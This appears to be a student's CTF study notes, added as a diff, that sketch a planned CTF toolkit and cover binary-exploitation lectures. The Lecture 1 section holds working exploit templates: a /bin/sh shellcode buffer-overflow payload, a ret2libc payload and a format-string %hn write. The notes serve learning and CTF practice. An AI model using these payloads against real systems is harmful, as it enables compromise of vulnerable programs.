@@ -1,0 +1,124 @@
+TOPOLOGY:
+TODO: --> Research Python, Django, and kubernetes clusters + docker --> How to implement
+
+	--> I want a user portal accessible from anywhere
+		|
+		|
+		-->You can access dockers prestaged with different configured OS's
+		-->Each OS will have a task selection like Forensics / pwnrev/ etc
+			|
+			--> They will be loaded with the tools required for each
+	--> Where are the files stored --> FTP alongside the client server
+
+
+
+~!!!!!!~-->Topology will be filled later after more research is done
+	MAIN FOLDER
+	|
+	-->SETUP.exe that imports all required resources
+	|
+	-->Writeup generation template
+	|
+	-->CTF Solver
+	|	|
+	|	-->Dependacy programs
+	|	|
+	|	-->Pwn
+	|	|
+	|	-->Rev
+	|	|
+	|	-->Forensics
+	|	|
+	|	-->Crypto
+	|	|
+	|	-->Web
+	|	|
+	|	-->Misc
+	|	|
+	|	-->General tools like convert asci to hex + other
+	-->Notes / Resources
+		|
+		-->Past writeups from other teamss
+		|
+		-->Tutorial slides
+			|
+			-->RPI slides
+			|
+			-->BinExp Indian guy slides
+
+Lecture 1
+bin/rev:	stack.gif --> add to program a stack visuializer --> maybe label mememory
+		read elf + strings --> output into pdf format --> also add flag format grep functionality
+		heap visuialization techniques
+		hexdump -d <program name>
+		objdump -d <program name>
+		Add functionality to view parameters passed to to functions in a program
+		Buffer overflow automation --> create program to find buffer offsets
+		~~~~~~~~Pull shellcode out of program
+		for i in `objdump -d shellcode.o | tr '\t' ' ' | tr ' ' '\n' | egrep '^[0-9a-f]{2}$' ` ; do echo -n "\x$i" ; done
+		~~~~~~~~
+		Return to libc automation --> Finds addresses
+		Link variables declared to be assigned names and then output their offsets
+			-->Then you can tell where they exist in the stack
+		Create a very good stack visulizer program that includes labels
+		Create linux scan --> int80 = system call --> search for environment variables set like "$PATH where all binaries are"
+			-->export PATH=$PWD:$PATH
+		nasm -f elf <filename.asm> --> compiles assembly file
+		system("ls"); is a way to interact with the shell in a c program 
+		https://pastebin.com/7xtET38f
+		~~~~~~~~~~~~~pass shellcode as arugment to program
+		./second `python -c 'import struct;shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"; bufferlen=108; print shellcode+"\x90"*(bufferlen-len(shellcode))+"BBBB"+struct.pack("<I", starting address of the buffer)'` 
+		~~~~~~~~~~~~~
+		Function to maximize the size of a NOP sled --> added bruteforce automation
+		Stored shellcode in environment variables --> Trying to pot shot for bytes you control --> maximize space
+		~~~~ret2libc attack~~~~
+		Using if/else statments we can try to see what type of attack is required
+		For example ret2libc requires --> NX disabled, stack protection disabled --> stack canaries disabled --> ASLR independant
+		ret2libc is weird were the next function call frame is -4 bytes so you need to account by adding 4
+		https://www.shellblade.net/docs/ret2libc.pdf
+		echo -e `python -c "import struct; print 'A'*108 + 'BBBB' + 'CCCC' + struct.pack('<I', <address of system>) + struct.pack('<I', <address of exit>) + <Address of argument to system>"`
+		RET2LIBC BYPASSES ASLR
+		~~~~~~~~~~~~~~~~~~~~~~
+		strcpy is vuln --> make a script to scan for vulnerable functions and highlight
+		~~~~~~~~FORMAT STRING
+		check for printf(variableName);
+		Scan for buffer locations in memory by "%x"*100
+		%n writes the (len) to the variable --> wrties to mememory
+		printf("rohit%n", &i);
+		printf("%d", i);   //outputs to 5 == len(rohit)
+		PLT holds all the addresses
+		GOT
+			ADDRESS IS ONLY ADDED AFTER A CALL IN THE PROGRAM HAS BEEN MADE PLT --> GOT
+			Adds program stub as "undefined" until function is called
+			holds addresses for dynamically linked functions in external libraries
+		You can make printf go to system for example
+		Template exploit
+			./string `python -c 'import struct; print "sh;#" + struct.pack("<I", <SOME_ADDRESS>) + struct.pack("<I", <SOME_ADDRESS>) +"%<SOME_VALUE>x%11$hn%<SOME_VALUE>x%12$hn"'`
+		I explain this exploit in Lec6 comment in string.c ^^^
+		$hn lets you write 2 bytes $n only allows 1 only exists for dynamicaly linked binaries
+		%<somenumber>x allows formatting spaces to add to length without increasing input str len
+		use gdb 
+			--> p system --> finds address of libc funcs
+		create script to automate the address breaking apart for this exploit
+
+		**HEAP**
+			This is the hard shit
+			UAF
+			**Find some more material on this --> I have little idea how this works
+		Sometimes we need to know the glibc version
+		cat /proc/10316/maps/
+		areans are indivual threads
+			arenas contain bins
+				bins hold chunks -->
+		There are even DUAF
+		https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/
+
+		THIS IS REALLY GOOD --> https://github.com/shellphish/how2heap
+rev:
+		Learn z3 and implement tempalte in python
+		
+misc:		exiftool output into pdf for forensics + stegsolve with many tools -->
+
+
+crypto:		Rumkin, rot47, etc bruteforce <-- for CyberPatriot and  regex constraint solver 
+		rsa attacker tool
